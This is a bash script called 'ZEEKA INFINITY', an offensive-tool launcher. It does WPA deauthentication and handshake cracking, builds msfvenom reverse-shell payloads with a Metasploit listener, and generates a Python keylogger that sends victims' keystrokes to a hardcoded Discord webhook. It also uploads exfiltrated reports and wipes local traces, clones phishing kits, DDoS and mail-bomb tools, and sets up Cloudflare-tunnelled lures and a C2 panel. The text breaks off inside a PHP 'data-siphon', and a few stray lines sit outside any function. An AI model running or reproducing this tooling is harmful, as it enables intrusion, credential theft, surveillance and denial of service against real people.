#!/bin/bash
# @project: ZEEKA INFINITY (v8.5) | @author: zeeka.xyz (Instagram)
# @license: GNU GPLv3 | @warning: Unauthorized redistribution without credit is prohibited.
# ---------------------------------------------------------------------------------------

# --- INITIAL CONFIGURATION ---
P="3010"; TRIES=5; LOG=".logs"; R="Reports"; T=""; TS=$(date +%H%M%S)
mkdir -p $R Tools
trap '' SIGINT

# --- WEBHOOK CONFIGURATION (HARDCODED) ---
WEBHOOK_URL="https://discord.com/api/webhooks/1479000177061789838/K9YwBFZyW5g7nxclDrc2oCD3cbeI148G2VoND0Tn5B4WddKCnPN4xNzTmu2TRAM7L7eH"

# --- ZEEKA ENGINES ---

log_to_webhook() {
    curl -s -H "Content-Type: application/json" -X POST -d "{\"content\": \"📡 **ZEEKA BEACON:** $1\"}" $WEBHOOK_URL > /dev/null
}

manage_reports() {
    local TYPE=$1
    local CONTENT=$2
    local FILE="$R/${TYPE}_${TS}.txt"
    echo -e "--- ZEEKA AUDIT LOG [$TS] ---\nTARGET: $T\n\n$CONTENT" > "$FILE"
    echo -e "\e[1;32m[+] Report Generated: $FILE\e[0m"
    log_to_webhook "New $TYPE Report for $T saved to database."
}

search_intel() {
    echo -e "\e[1;34m[?] ENTER SEARCH TERM (IP, URL, or Keyword):\e[0m"
    read -p "SEARCH >> " query
    echo -e "\e[1;33m[*] SEARCHING DATABASE...\e[0m"
    grep -rni "$query" "$R" --color=always | sed "s|^$R/|📂 |"
    if [ $? -ne 0 ]; then echo -e "\e[1;31m[-] NO DATA FOUND FOR: $query\e[0m"; fi
}

# --- THE WI-FI REAPER ---

wifi_reaper() {
    echo -e "\e[1;33m[*] INITIALIZING WI-FI REAPER...\e[0m"
    
    # 1. Detect Interface
    WIFACE=$(iw dev | awk '$1=="Interface"{print $2}' | head -n1)
    if [[ -z "$WIFACE" ]]; then echo "[-] No Wi-Fi Adapter Found."; return; fi
    
    # 2. Enable Monitor Mode
    echo "[*] Killing conflicting processes and starting Monitor Mode on $WIFACE..."
    sudo airmon-ng check kill > /dev/null
    sudo airmon-ng start $WIFACE > /dev/null
    MON_IFACE="${WIFACE}mon"
    
    # 3. Scanning Phase
    echo -e "\e[1;34m[*] SCANNING AIRWAVES (Press Ctrl+C when you see your target)...\e[0m"
    sleep 2
    sudo airodump-ng $MON_IFACE
    
    # 4. Target Selection
    read -p "ENTER TARGET BSSID: " bssid
    read -p "ENTER CHANNEL (CH): " chan
    read -p "ENTER TARGET CLIENT MAC (Optional, hit Enter for all): " client
    
    # 5. The Rip (Capture + Deauth)
    echo -e "\e[1;31m[*] STARTING DEAUTH ATTACK & CAPTURE...\e[0m"
    # Run capture in background
    FILE_NAME="$R/Handshake_${TS}"
    xterm -e "sudo airodump-ng -c $chan --bssid $bssid -w $FILE_NAME $MON_IFACE" &
    
    # Send Deauth packets to force the handshake
    if [[ -z "$client" ]]; then
        sudo aireplay-ng --deauth 20 -a $bssid $MON_IFACE
    else
        sudo aireplay-ng --deauth 20 -a $bssid -c $client $MON_IFACE
    fi
    
    echo -e "\e[1;32m[+] ATTACK COMPLETE. Check xterm for 'WPA Handshake' message.\e[0m"
    echo -e "[*] Capture saved as $FILE_NAME-01.cap"
    
    # 6. Cleanup
    read -p "Press Enter to disable Monitor Mode..."
    sudo airmon-ng stop $MON_IFACE > /dev/null
    sudo systemctl restart NetworkManager
}

handshake_cracker() {
    echo -e "\e[1;34m[*] ZEEKA HANDSHAKE CRACKER ENGINE\e[0m"
    
    # 1. Locate the Handshake
    echo -e "\e[1;33m[!] RECENT CAPTURES IN REPORTS:\e[0m"
    ls $R/*.cap 2>/dev/null || echo "[-] No .cap files found in $R"
    
    read -p "ENTER PATH TO .cap FILE: " cap_file
    if [[ ! -f "$cap_file" ]]; then echo "[-] File not found!"; return; fi
    
    # 2. Select Wordlist
    echo -e "\e[1;33m[?] SELECT WORDLIST:\e[0m"
    echo " [1] Rockyou (/usr/share/wordlists/rockyou.txt)"
    echo " [2] Custom Path"
    read -p "CHOICE >> " w_choice
    
    case $w_choice in
        1) wlist="/usr/share/wordlists/rockyou.txt" ;;
        2) read -p "ENTER FULL PATH: " wlist ;;
        *) echo "Invalid choice."; return ;;
    esac

    # 3. Execution
    if [[ ! -f "$wlist" ]]; then 
        echo -e "\e[1;31m[-] Wordlist not found! Attempting to unzip rockyou...\e[0m"
        sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
    fi

    echo -e "\e[1;32m[*] CRACKING STARTED... (This may take a while)\e[0m"
    sudo aircrack-ng -w "$wlist" "$cap_file"
    
    log_to_webhook "Handshake cracking session initiated for $cap_file using $wlist"
}

fast_scan_wifi() {
    echo -e "\e[1;33m[*] INITIATING FAST-SCAN ENGINE...\e[0m"
    WIFACE=$(iw dev | awk '$1=="Interface"{print $2}' | head -n1)
    if [[ -z "$WIFACE" ]]; then echo "[-] No Wi-Fi Adapter Found."; return; fi

    # Ensure Monitor Mode is ON
    sudo airmon-ng start $WIFACE > /dev/null
    MON_IFACE="${WIFACE}mon"

    echo -e "[*] Listening for 10 seconds to map targets..."
    # Capture targets to a temporary CSV
    sudo timeout 10s airodump-ng --write /tmp/zeeka_scan --output-format csv $MON_IFACE > /dev/null 2>&1

    # Display the targets in a clean list
    echo -e "\n\e[1;34mID | BSSID             | CH | ESSID (NAME)\e[0m"
    echo "------------------------------------------------"
    grep "WPA" /tmp/zeeka_scan-01.csv | awk -F, '{print NR "  | " $1 " | " $4 " | " $14}' | sed 's/ //g' | column -t -s '|'
    
    echo -e "\n\e[1;32m[?] SELECT TARGET ID TO LOCK & REAP:\e[0m"
    read -p "ID >> " target_id
    
    # Extract the data for the selected ID
    bssid=$(grep "WPA" /tmp/zeeka_scan-01.csv | awk -F, -v id="$target_id" 'NR==id {print $1}' | sed 's/ //g')
    chan=$(grep "WPA" /tmp/zeeka_scan-01.csv | awk -F, -v id="$target_id" 'NR==id {print $4}' | sed 's/ //g')
    
    rm /tmp/zeeka_scan* # Clean up temp files
    
    if [[ -n "$bssid" ]]; then
        echo -e "[+] LOCKED ON: $bssid (Channel $chan)"
        # Jump straight to the Reaper logic using these variables
        start_reaper_auto "$bssid" "$chan"
    else
        echo "[-] Invalid ID."
    fi
}

start_reaper_auto() {
    local bssid=$1; local chan=$2
    echo -e "\e[1;31m[*] AUTO-REAPER ENGAGED on $bssid...\e[0m"
    FILE_NAME="$R/AutoHandshake_${TS}"
    xterm -e "sudo airodump-ng -c $chan --bssid $bssid -w $FILE_NAME ${WIFACE}mon" &
    sudo aireplay-ng --deauth 30 -a $bssid ${WIFACE}mon
    echo -e "[+] Attack finished. Check xterm for 'WPA Handshake'."
    sudo airmon-ng stop ${WIFACE}mon > /dev/null
    sudo systemctl restart NetworkManager
}

ghost_decoy() {
    echo -e "\e[1;33m[*] ACTIVATING GHOST DECOY ENGINE...\e[0m"
    IFACE=$(ip route | grep default | awk '{print $5}' | head -n1)
    
    # List of "Boring" Hostnames to blend in
    NAMES=("HP-Printer-M102" "DESKTOP-9N2KL" "Android-Phone" "iPhone-14" "iPad-Air" "Work-Station-04")
    NEW_NAME=${NAMES[$RANDOM % ${#NAMES[@]}]}

    echo -e "[*] Scrambling Identity on Interface: $IFACE"
    
    # Change MAC Address
    sudo ifconfig $IFACE down
    sudo macchanger -r $IFACE
    
    # Change Hostname (Temporary)
    sudo hostnamectl set-hostname $NEW_NAME
    
    sudo ifconfig $IFACE up
    echo -e "\e[1;32m[+] SUCCESS: You are now appearing as '$NEW_NAME' with a Random MAC.\e[0m"
    
    log_to_webhook "Ghost Decoy Active. New Identity: $NEW_NAME on $IFACE"
}

auto_pwn_intel() {
    [[ -z "$T" ]] && { echo -e "\e[1;31m[-] NO TARGET SET. Use [T] first.\e[0m"; return; }
    
    echo -e "\e[1;33m[*] INITIATING AUTO-PWN SCAN ON $T...\e[0m"
    echo -e "[*] Scanning services and versions (Be patient)..."
    
    # 1. Aggressive version scan saved to a hidden file
    sudo nmap -sV --version-intensity 5 "$T" -oX .temp_scan.xml > /dev/null
    
    echo -e "\e[1;34m[*] CROSS-REFERENCING WITH EXPLOIT DATABASE...\e[0m"
    echo "------------------------------------------------------------"
    
    # 2. Use Searchsploit to find matches for the Nmap XML output
    searchsploit --nmap .temp_scan.xml | tee "$R/Pwn_Report_${TS}.txt"
    
    # 3. Final Check
    if [[ ! -s "$R/Pwn_Report_${TS}.txt" ]]; then
        echo -e "\e[1;31m[-] No direct exploits found in local DB.\e[0m"
    else
        echo -e "\n\e[1;32m[+] REPORT SAVED: $R/Pwn_Report_${TS}.txt\e[0m"
        log_to_webhook "Auto-Pwn Report generated for $T. Critical vulnerabilities may exist."
    fi
    
    rm .temp_scan.xml
}

auto_pwn_suite() {
    [[ -z "$T" ]] && { echo -e "\e[1;31m[-] NO TARGET SET. Use [T] first.\e[0m"; return; }
    
    echo -e "\e[1;33m[*] PHASE 1: VULNERABILITY MAPPING ON $T...\e[0m"
    # 1. Version Scan
    sudo nmap -sV --version-intensity 5 "$T" -oX .temp_scan.xml > /dev/null
    
    # 2. Show Potential Exploits
    echo -e "\e[1;34m[*] CROSS-REFERENCING EXPLOIT DATABASE...\e[0m"
    searchsploit --nmap .temp_scan.xml | tee "$R/Pwn_Report_${TS}.txt"
    
    echo -e "\n\e[1;33m[*] PHASE 2: PAYLOAD GENERATION\e[0m"
    read -p "Would you like to generate a Reverse Shell for this target? (y/n): " gen_p
    
    if [[ "$gen_p" == "y" || "$gen_p" == "Y" ]]; then
        LIP=$(hostname -I | awk '{print $1}')
        read -p "Enter Port for Listener (default 4444): " LPORT
        LPORT=${LPORT:-4444}
        
        echo -e " [1] Windows (.exe)  [2] Android (.apk)  [3] Linux (.elf)"
        read -p "Select Platform >> " plat
        
        case $plat in
            1) PAYLOAD="windows/meterpreter/reverse_tcp"; EXT="exe" ;;
            2) PAYLOAD="android/meterpreter/reverse_tcp"; EXT="apk" ;;
            3) PAYLOAD="linux/x64/meterpreter/reverse_tcp"; EXT="elf" ;;
            *) echo "Invalid choice"; return ;;
        esac

        OUT_FILE="$R/Payload_$TS.$EXT"
        echo -e "[*] Building Payload: $OUT_FILE (LHOST=$LIP LPORT=$LPORT)"
        msfvenom -p $PAYLOAD LHOST=$LIP LPORT=$LPORT -f $EXT -o "$OUT_FILE" > /dev/null 2>&1
        
        echo -e "\e[1;32m[+] PAYLOAD CREATED: $OUT_FILE\e[0m"
        log_to_webhook "Payload generated for $T. Platform: $EXT | Port: $LPORT"

        # 3. Phase 3: Auto-Listener
        read -p "Start Metasploit Listener now? (y/n): " start_l
        if [[ "$start_l" == "y" || "$start_l" == "Y" ]]; then
            echo -e "\e[1;34m[*] LAUNCHING METASPLOIT HANDLER...\e[0m"
            msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $PAYLOAD; set LHOST $LIP; set LPORT $LPORT; exploit"
        fi
    fi
    rm .temp_scan.xml
}

data_exfiltrator() {
    echo -e "\e[1;33m[*] INITIATING SECURE DATA EXFILTRATION...\e[0m"
    
    # 1. Package the Data
    ZIP_NAME="ZEEKA_BACKUP_${TS}.zip"
    read -sp "Enter an encryption password for the ZIP: " z_pass
    echo -e "\n[*] Compressing and Encrypting Reports..."
    
    # Zip the Reports folder with a password
    zip -erP "$z_pass" "$ZIP_NAME" "$R" > /dev/null 2>&1
    
    if [[ ! -f "$ZIP_NAME" ]]; then
        echo -e "\e[1;31m[-] Error: Compression failed.\e[0m"; return
    fi

    # 2. Anonymous Upload (using bashupload.com)
    echo -e "\e[1;34m[*] UPLOADING TO SECURE CLOUD (ANONYMOUS)...\e[0m"
    UP_LINK=$(curl -s --upload-file "./$ZIP_NAME" "https://bashupload.com/$ZIP_NAME")
    
    if [[ -n "$UP_LINK" ]]; then
        echo -e "\e[1;32m[+] UPLOAD SUCCESSFUL!\e[0m"
        echo -e "[*] Link: $UP_LINK"
        
        # 3. Alert Discord
        log_to_webhook "☁️ DATA EXFIL COMPLETE. File: $ZIP_NAME | Link: $UP_LINK | Target was: $T"
        
        # 4. Local Cleanup (Anti-Forensics)
        read -p "Wipe local ZIP and Reports folder now? (y/n): " wipe
        if [[ "$wipe" == "y" ]]; then
            rm -rf "$ZIP_NAME" "$R"/*
            echo -e "\e[1;31m[!] LOCAL TRACES WIPED.\e[0m"
        fi
    else
        echo -e "\e[1;31m[-] Upload failed. Check connection.\e[0m"
    fi
}

venom_logger_gen() {
    echo -e "\e[1;33m[*] INITIATING VENOM-LOGGER GENERATOR...\e[0m"
    
    # 1. Setup the Script
    FILENAME="logger_$TS.py"
    echo -e "[*] Encoding Webhook into Python Payload..."
    
    # 2. The Python Payload (Self-Contained)
    # Note: We keep EOF unquoted so Bash CAN inject the real WEBHOOK_URL variable here.
    cat <<EOF > "$FILENAME"
import pynput.keyboard
import requests
import threading
import os

WEBHOOK_URL = "$WEBHOOK_URL"

class Keylogger:
    def __init__(self, interval):
        self.log = "--- ZEEKA KEYLOG START ---"
        self.interval = interval

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        if self.log != "":
            try:
                requests.post(WEBHOOK_URL, json={"content": self.log})
                self.log = ""
            except:
                pass
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

my_keystroke_logger = Keylogger(60)
my_keystroke_logger.start()
EOF

    echo -e "\e[1;32m[+] PAYLOAD CREATED: $FILENAME\e[0m"
    log_to_webhook "Venom-Logger Payload Generated: $FILENAME"
}

    echo -e "\e[1;32m[+] PAYLOAD CREATED: $FILENAME\e[0m"
    
    # 3. Instruction for the user
    echo -e "\n\e[1;34m[!] TO DEPLOY:\e[0m"
    echo " 1. Send $FILENAME to target."
    echo " 2. Target must have 'pynput' and 'requests' installed."
    echo

# --- UI COMPONENTS ---

b1() { clear; echo -e "\e[1;31m#################################################\n#           CRITICAL: ENCRYPTED ACCESS          #\n#       ZEEKA OFFENSIVE SECURITY TERMINAL       #\n#################################################\e[0m"; }
b2() { echo -e "\e[31;1m  ███████╗███████╗███████╗██╗  ██╗ █████╗ \n  ╚══███╔╝██╔════╝██╔════╝██║ ██╔╝██╔══██╗\n    ███╔╝ █████╗  █████╗  █████╔╝ ███████║\n   ███╔╝  ██╔══╝  ██╔══╝  ██╔═██╗ ██╔══██║\n  ███████╗███████╗███████╗██║  ██╗██║  ██║\n  ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝\e[0m"; }
b3() { clear; echo -e "\e[1;37;41m\n########## ALERT: ACCESS DENIED! ##########\n\e[0m"; sleep 2; }
load() { echo -ne "\e[32m[#] Decrypting: "; for i in {1..20}; do echo -ne "█"; sleep 0.03; done; echo -e " [OK]\e[0m"; sleep 1; }

# --- ACCESS CONTROL ---

while [ $TRIES -gt 0 ]; do
    b1
    [[ -f "$LOG" ]] && echo -e "\e[33m[!] FAIL LOGS:\n$(cat $LOG)\e[0m"
    read -sp "ENTER KEY: " ip; echo -e "\n"
    if [[ "$ip" == "$P" ]]; then
        rm -f "$LOG"; load; break
    else
        echo "Fail: $(date)" >> "$LOG"; b3; ((TRIES--))
    fi
    [[ $TRIES -eq 0 ]] && { rm -rf Tools $R -- "$0"; exit; }
done

# --- MAIN LOOP ---

while true; do
    clear
    IP=$(curl -s --max-time 2 https://ifconfig.me || echo "OFFLINE")
    MEM=$(free | grep Mem | awk '{print $3/$2 * 100.0}' | cut -d. -f1)
    CPU=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1}')
    TS=$(date +%H%M%S)
    
    echo -e "\e[44;37;1m IP: $IP | CPU: $CPU% | RAM: $MEM% | TOR: $(systemctl is-active tor) \e[0m"
    [[ -n "$T" ]] && echo -e "\e[42;30;1m TARGET: $T \e[0m" || echo -e "\e[41;37;1m NO TARGET SET \e[0m"
    
    b2
    echo -e "\e[36m
 [01] Update Sys    [09] Red Hawk     [17] SQLmap (Ghauri)
 [02] ZPhisher      [10] HackerPro    [18] Nmap Scan
 [03] CamPhish      [11] TigerVirus   [19] SocialFish
 [04] Subscan       [12] FaceBash     [20] Harvester
 [05] Mail Bomb     [13] DARKARMY     [21] Reset Tools
 [06] DDoS Ripper   [14] Auto-Tor     [22] Refresh HUD
 [07] Track IP      [15] Sherlock     [23] Update All
 [08] Dorks-Eye     [16] Seeker       [24] Web Crawler
 [25] BACKUP DATA   [26] INSTAGRAM    [28] SEARCH INTEL
 [27] GHOST MODE    [28] search intel [29]
 [30] WIFI CRACKER  [31] handshake    [32] Fast scan WIFI
 [33] Ghost Decoy   [34] AUTO-PWN INTE[35] DATA EXFIL
 [36] Zeeak's CAM   [37] Insta Tool
 [00] EXIT SCRIPT
 -----------------------------------------------------------
 [T] LOCK TARGET    [V] VULN SCAN     [R] QUICK RECON
 [P] PAYLOAD GEN    [L] MSF LISTEN    [Z] ZIP REPORTS\e[0m"
 read -p "Zeeka's Option >> " sel; cd "$(dirname "$0")"
 case $sel in
  T|t) read -p "Target: " T ;;
  R|r) 
    [[ -z "$T" ]] && echo "Set T!" || {
        echo "[*] Running Recon..."
        DATA=$(nmap -F "$T")
        manage_reports "RECON" "$DATA"
    } ;;
  V|v) [[ -z "$T" ]] && echo "Set T!" || nuclei -u "$T" -silent | tee "$R/V_$TS.txt" ;;
  W|w|24) [[ -z "$T" ]] && echo "Set T!" || (wget --spider --recursive --level=2 "$T" 2>&1 | grep '^--' | awk '{print $3}' | sort -u | tee "$R/Links_$TS.txt") ;;
  B|b) [[ -z "$T" ]] && read -p "IP: " T; read -p "Srv: " s; read -p "User: " u; read -p "List: " w; hydra -l $u -P $w $T $s -V ;;
  P|p) read -p "Type(apk/exe): " f; read -p "LHOST: " lh; read -p "LPORT: " lp; [[ "$f" == "apk" ]] && py="android/meterpreter/reverse_tcp" || py="windows/x64/meterpreter/reverse_tcp"; msfvenom -p $py LHOST=$lh LPORT=$lp -o "$R/p_$TS.${f/exe/exe}" ;;
  L|l) read -p "Type(apk/exe): " f; read -p "LHOST: " lh; read -p "LPORT: " lp; [[ "$f" == "apk" ]] && py="android/meterpreter/reverse_tcp" || py="windows/x64/meterpreter/reverse_tcp"; echo -e "use exploit/multi/handler\nset payload $py\nset LHOST $lh\nset LPORT $lp\nexploit" > .l.rc; msfconsole -r .l.rc; rm .l.rc ;;
  F|f|26) xdg-open "https://www.instagram.com/zeeka.xyz" || termux-open-url "https://www.instagram.com/zeeka.xyz" ;;
  01|1) 
    echo -e "\e[1;33m[*] INITIATING FULL ZEEKA PREP...\e[0m"
    sudo apt update && sudo apt install -y git python3 php curl nmap tor wget nuclei hydra metasploit-framework zip macchanger
    
    # Install Ghauri if it's missing
    if ! command -v ghauri &> /dev/null; then
        echo "[*] Installing Ghauri..."
        pip3 install ghauri
    fi
    
    # Create the reporting structure
    mkdir -p $R Tools
    echo -e "\e[1;32m[+] ZEEKA INFINITY v8.0 ENVIRONMENT READY.\e[0m" ;;
  02|2) cd Tools; [[ ! -d "z" ]] && git clone https://github.com/htr-tech/zphisher z; cd z && bash zphisher.sh ;;
  03|3) cd Tools; [[ ! -d "c" ]] && git clone https://github.com/techchipnet/CamPhish c; cd c && bash camphish.sh ;;
  04|4) cd Tools; [[ ! -d "s" ]] && git clone https://github.com/zidansec/subscan s; cd s && ./subscan $T ;;
  05|5) 
    echo -e "\n--- Zeeka Custom Mailer (Async v2) ---"
    
    # Auto-install the library if it's missing
    if ! python3 -c "import aiosmtplib" &> /dev/null; then
        echo "[+] Installing required engine components..."
        pip install aiosmtplib --break-system-packages --quiet
    fi

    python3 ~/Zeeka/zeeka_mail.py
    ;;
  06|6) cd Tools; [[ ! -d "d" ]] && git clone https://github.com/palahsu/DDoS-Ripper d; cd d && python3 DRipper.py ;;
  07|7) cd Tools; [[ ! -d "ti" ]] && git clone https://github.com/htr-tech/track-ip ti; cd ti && bash trackip ;;
  08|8) cd Tools; [[ ! -d "de" ]] && git clone https://github.com/BullsEye0/dorks-eye de; cd de && python3 dorks-eye.py ;;
  09|9) cd Tools; [[ ! -d "rh" ]] && git clone https://github.com/Tuhinshubhra/RED_HAWK rh; cd rh && php rhawk.php ;;
  10) cd Tools; [[ ! -d "hp" ]] && git clone https://github.com/jaykali/hackerpro hp; cd hp && python2 hackerpro.py ;;
  11) cd Tools; [[ ! -d "tv" ]] && git clone https://github.com/Devil-Tigers/TigerVirus tv; cd tv && bash app.sh ;;
  12) cd Tools; [[ ! -d "fb" ]] && git clone https://github.com/fu8uk1/facebash fb; cd fb && bash install.sh ;;
  13) cd Tools; [[ ! -d "da" ]] && git clone https://github.com/D4RK-4RMY/DARKARMY da; cd da && python2 darkarmy.py ;;
  14) cd Tools; [[ ! -d "at" ]] && git clone https://github.com/FDX100/Auto_Tor_IP_changer at; cd at && python3 install.py ;;
  15) cd Tools; [[ ! -d "sh" ]] && git clone https://github.com/sherlock-project/sherlock sh; cd sh && python3 sherlock.py $T ;;
  16) cd Tools; [[ ! -d "sk" ]] && git clone https://github.com/thewhiteh4t/seeker sk; cd sk && python3 seeker.py ;;
  17) 
    [[ -z "$T" ]] && echo "Set T!" || {
        echo -e "\e[1;35m[*] STARTING GHAURI ADVANCED SQLi INJECTION...\e[0m"
        ghauri -u "$T" --batch --banner | tee "$R/SQL_$TS.txt"
    } ;;
  18) [[ -z "$T" ]] && read -p "IP: " T; nmap -A -v "$T" | tee "$R/N_$TS.txt" ;;
  19) cd Tools; [[ ! -d "sf" ]] && git clone https://github.com/An0nUD4Y/SocialFish sf; cd sf && python3 SocialFish.py ;;
  20) cd Tools; [[ ! -d "h" ]] && git clone https://github.com/laramies/theHarvester h; cd h && python3 theHarvester.py -d $T -b all ;;
  21) rm -rf Tools && mkdir Tools ;;
  22) sleep 1 ;;
  23) for d in Tools/*/ ; do [[ -d "$d" ]] && cd "$d" && git pull && cd ../../ ; done ;;
  Z|z|25) zip -r "$R/Archive_$TS.zip" "$R" && echo "Backup Saved." ;;
  27|ghost) 
    echo -e "\e[1;33m[*] ACTIVATING GHOST PROTOCOL...\e[0m"
    IFACE=$(ip route | grep default | awk '{print $5}' | head -n1)
    sudo ifconfig $IFACE down
    sudo macchanger -r $IFACE | grep "New MAC"
    sudo ifconfig $IFACE up
    sudo systemctl restart tor
    echo -e "\e[1;32m[+] IDENTITY SCRAMBLED. TOR ACTIVE. MAC RANDOMIZED.\e[0m"
    log_to_webhook "Ghost Protocol Engaged on $IFACE" ;;
	V|v) [[ -z "$T" ]] && echo "Set Target first!" || {
            echo -e "\e[1;34m[*] TRIGGERING VULN-ENGINE...\e[0m"
            nuclei -u "$T" -severity critical,high -silent -o "$R/V_$TS.txt"
            if [ -s "$R/V_$TS.txt" ]; then
                log_to_webhook "🚨 VULNERABILITY FOUND ON $T. Check Reports."
            fi
        } ;;
	30) wifi_reaper ;;
	31) handshake_cracker ;;
	32) fast_scan_wifi ;;
	33) ghost_decoy ;;
	34) auto_pwn_suite ;;
	35) data_exfiltrator ;;
	36)
		# =================================================================
		# PART 1: THE COMMAND CENTER & INFRASTRUCTURE (TITANIUM PRO MAX)
		# =================================================================
		O5_DIR="$HOME/Zeeka/unified_remote"
		O5_PORT=4444
		O5_WEBHOOK="https://discord.com/api/webhooks/1479000177061789838/K9YwBFZyW5g7nxclDrc2oCD3cbeI148G2VoND0Tn5B4WddKCnPN4xNzTmu2TRAM7L7eH"

		clear
		echo -e "\e[1;31m"
		echo "  ███████╗███████╗███████╗██╗  ██╗ █████╗ "
		echo "  ╚══███╔╝██╔════╝██╔════╝██║ ██╔╝██╔══██╗"
		echo "    ███╔╝ █████╗  █████╗  █████╔╝ ███████║"
		echo "   ███╔╝  ██╔══╝  ██╔══╝  ██╔═██╗ ██╔══██║"
		echo "  ███████╗███████╗███████╗██║  ██╗██║  ██║"
		echo "  ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝"
		echo -e "      [ SYSTEM STATUS: PRO MAX PERSISTENCE ]\e[0m"
		echo -e "\e[1;37m--------------------------------------------------\e[0m"

		# --- 1. PRE-FLIGHT DEPENDENCY CHECK ---
		echo -ne "[*] Checking Dependencies..."
		for tool in php curl unzip grep awk; do
			if ! command -v $tool &> /dev/null; then
				echo -e "\n\e[1;31m[!] Error: $tool is not installed. Install it and try again.\e[0m"
				exit
			fi
		done
		if [[ ! -f "$HOME/cloudflared" ]]; then
			echo -e "\n\e[1;31m[!] Error: cloudflared not found in $HOME.\e[0m"
			exit
		fi
		echo -e " \e[1;32m[READY]\e[0m"

		# --- 2. SANITIZATION PROTOCOL ---
		echo -ne "[*] Sanitizing Workspace..."
		pkill -9 php > /dev/null 2>&1
		pkill -9 cloudflared > /dev/null 2>&1
		rm -rf "$O5_DIR" 2>/dev/null
		# Clean old logs so the link extraction is 100% fresh
		rm -f target.log admin.log 2>/dev/null 
		mkdir -p "$O5_DIR/captured"
		echo -e " \e[1;32m[CLEAN]\e[0m"

		# --- 3. PERMISSION REINFORCEMENT ---
		echo -ne "[*] Hardening Permissions..."
		chmod -R 777 "$HOME/Zeeka" > /dev/null 2>&1
		cd "$O5_DIR" || exit
		echo -e " \e[1;32m[SECURE]\e[0m"

		# --- 4. ENGINE DEPLOYMENT ---
		echo -ne "[*] Launching Local PHP Engine..."
		php -S 127.0.0.1:$O5_PORT > /dev/null 2>&1 &
		echo -e " \e[1;32m[PORT $O5_PORT ACTIVE]\e[0m"

		# --- 5. BEEF IDENTITY EXTRACTION (THE "DEEP-DIVE" FIX) ---
		echo -ne "[*] Locating BeEF Credentials..."
		# We target the main beef: block specifically to avoid database user/pass
		BEEF_CFG=$(find $HOME -maxdepth 3 -name "config.yaml" | grep "beef/config.yaml" | head -n 1)

		if [[ -f "$BEEF_CFG" ]]; then
			# This regex looks specifically for the 'beef' section, then grabs the UI user/pass
			B_USER=$(awk '/beef:/ {f=1} f && /user:/ {print $2; exit}' "$BEEF_CFG" | tr -d '"' | tr -d "'")
			B_PASS=$(awk '/beef:/ {f=1} f && /passwd:/ {print $2; exit}' "$BEEF_CFG" | tr -d '"' | tr -d "'")
			echo -e " \e[1;32m[FOUND]\e[0m"
		else
			B_USER="beef"; B_PASS="beef"
			echo -e " \e[1;33m[DEFAULT]\e[0m"
		fi

		# --- 6. DUAL TUNNEL NEGOTIATION ---
		# --- 8. PRECISION TITANIUM UPLINK EXTRACTION (STABLE) ---
                echo -e "\e[1;30m[*] FORCING ENVIRONMENT SANITIZATION...\e[0m"
                # Kill any ghost processes that are locking the ports
                pkill -9 cloudflared > /dev/null 2>&1
                
                # Fresh logs with global write permissions
                rm -f ../target.log ../admin.log
                touch ../target.log ../admin.log
                chmod 777 ../target.log ../admin.log

                echo -e "\e[1;34m[*] NEGOTIATING SECURE UPLINKS...\e[0m"
                
                # Restart the tunnels inside this block to ensure they start FRESH
                # --- 6. DUAL TUNNEL NEGOTIATION (REPAIRED) ---
                echo -ne "[*] Starting Target Uplink..."
                # We add '--logfile' to force Cloudflare to write the full event log
                ~/cloudflared tunnel --url http://127.0.0.1:4444 --logfile ../target.log > /dev/null 2>&1 &
                
                echo -ne "\n[*] Starting Admin Uplink..."
                ~/cloudflared tunnel --url http://127.0.0.1:3000 --logfile ../admin.log > /dev/null 2>&1 &

                TARGET_LINK=""
                ADMIN_LINK=""
                TIMER=0
                MAX_WAIT=25 # Increased wait for mobile/iPad CPU scaling

                echo -ne "[*] SCANNING LOGS FOR UNIQUE SIGNATURES: "

                while [ $TIMER -lt $MAX_WAIT ]; do
                        # High-Speed Scraper
                        TARGET_LINK=$(grep -o 'https://[a-zA-Z0-9-]*\.trycloudflare\.com' ../target.log | grep -v 'api' | tail -n 1)
                        ADMIN_LINK=$(grep -o 'https://[a-zA-Z0-9-]*\.trycloudflare\.com' ../admin.log | grep -v 'api' | tail -n 1)

                        if [ ! -z "$TARGET_LINK" ] && [ ! -z "$ADMIN_LINK" ]; then
                                echo -e " \e[1;32m[SUCCESS]\e[0m"
                                break
                        fi

                        echo -ne "\e[1;33m.\e[0m"
                        sleep 1
                        ((TIMER++))
                done

                if [ -z "$TARGET_LINK" ]; then
                        echo -e "\n\e[1;31m[!] TIMEOUT: LOGS ARE EMPTY. TRYING MANUAL EXTRACT...\e[0m"
                        # Fallback: check if the file even exists
                        ls -l ../target.log
                        exit 1
                fi

                clear
                echo -e " \e[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
                echo -e "  \e[1;37mZEEKA APEX C2 \e[0m \e[1;30m//\e[0m \e[1;32mUPLINK STABLE\e[0m"
                echo -e " \e[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
                echo -e "  🚀 \e[1;32mTARGET LURE :\e[0m \e[4;37m$TARGET_LINK\e[0m"
                echo -e "  💎 \e[1;36mADMIN PANEL :\e[0m \e[4;37m$ADMIN_LINK/ui/panel\e[0m"
                echo -e " \e[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
		# =================================================================
		# PART 2: THE ADVANCED DATA-SIPHON (PRO MAX PHP)
		# =================================================================
		echo -ne "[*] Injecting Siphon Logic..."
		
		# Quoted '_EOF_PHP' ensures all symbols are written literally to the file
                cat <<'_EOF_PHP' > post.php
<?php
/**
